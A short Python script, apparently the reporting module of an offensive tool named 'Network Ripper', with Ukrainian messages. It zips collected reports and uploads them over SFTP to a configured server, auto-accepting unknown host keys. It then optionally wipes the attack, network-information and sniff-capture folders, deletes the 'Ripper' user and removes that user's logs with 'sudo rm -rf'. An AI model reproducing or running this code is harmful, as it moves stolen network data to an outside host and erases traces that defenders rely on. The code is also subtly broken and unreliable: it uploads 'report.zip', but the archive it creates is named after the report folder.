import os
import shutil
import subprocess
import sys

import paramiko
import configparser


def delete_user(username):
    try:
        subprocess.run(['sudo', 'userdel', '-r', username], check=True)
        print(f"Користувач {username} був успішно видалений.")

        logs_directory = f'/var/log/{username}'
        if os.path.exists(logs_directory):
            subprocess.run(['sudo', 'rm', '-rf', logs_directory], check=True)
            print(f"Логи користувача {username} були успішно видалені.")
    except subprocess.CalledProcessError:
        print(f"Помилка: Не вдалося видалити користувача {username}.")
        sys.exit(1)


def delete_reports(folder_path):
    for item in os.listdir(folder_path):
        item_path = os.path.join(folder_path, item)
        if os.path.isfile(item_path):
            os.remove(item_path)
        elif os.path.isdir(item_path):
            shutil.rmtree(item_path)


def main():
    try:
        config = configparser.ConfigParser()
        config.read('local_config.ini')

        report_folder = config.get('report_path', 'base_path')
        archive_path = "report.zip"

        shutil.make_archive(report_folder, 'zip', report_folder)

        ip, username, password = config.get('settings', 'report_ssh_server_creds').split(":")

        with paramiko.SSHClient() as ssh:
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password)

            with ssh.open_sftp() as sftp:
                sftp.put(archive_path, archive_path)

        os.remove(archive_path)

        print("[+] Report sent successfully.\n")

        if config.getboolean('settings', 'clear_logs_after_sending_report'):
            delete_reports(config.get('report_path', 'attacks_path'))
            delete_reports(config.get('report_path', 'network_information_path'))
            delete_reports(config.get('report_path', 'sniff_path'))

        if config.getboolean('settings', 'uninstall_network_ripper_after_sending_report'):
            delete_user("Ripper")

    except Exception as e:
        print(f"[-] Report sending error: {e}")


if __name__ == "__main__":
    main()
